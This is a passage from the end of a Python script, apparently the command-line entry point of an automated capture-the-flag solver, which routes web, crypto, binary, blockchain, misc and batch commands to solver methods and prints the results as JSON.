    if cmd == "web" and len(sys.argv) > 2:
        result = solver.solve(
            metadata={"name": "Web Problem", "tags": [{"name": "Web"}], "problemType": 1},
            url=sys.argv[2]
        )
    elif cmd == "crypto" and len(sys.argv) > 2:
        result = solver.solve(
            metadata={"name": "Crypto Problem", "tags": [{"name": "Crypto"}]},
            ciphertext=sys.argv[2]
        )
    elif cmd == "binary" and len(sys.argv) > 2:
        result = solver.solve(
            metadata={"name": "Binary Problem", "tags": [{"name": "Reverse"}]},
            filepath=sys.argv[2]
        )
    elif cmd == "blockchain" and len(sys.argv) > 2:
        with open(sys.argv[2], 'r', encoding='utf-8') as f:
            source = f.read()
        result = solver.solve(
            metadata={"name": "Blockchain Problem", "tags": [{"name": "Blockchain"}]},
            source=source
        )
    elif cmd == "misc" and len(sys.argv) > 2:
        result = solver.solve(
            metadata={"name": "Misc Problem", "tags": [{"name": "Misc"}]},
            filepath=sys.argv[2]
        )
    elif cmd == "batch" and len(sys.argv) > 2:
        with open(sys.argv[2], 'r', encoding='utf-8') as f:
            data = json.load(f)
        problems = data.get("problems", data if isinstance(data, list) else [])
        containers = data.get("containers", {})
        attachments = data.get("attachments", {})
        results = solver.batch_solve(problems, containers, attachments)
        solver.print_summary(results)
        return
    else:
        print(f"Unknown command: {cmd}")
        return
    
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
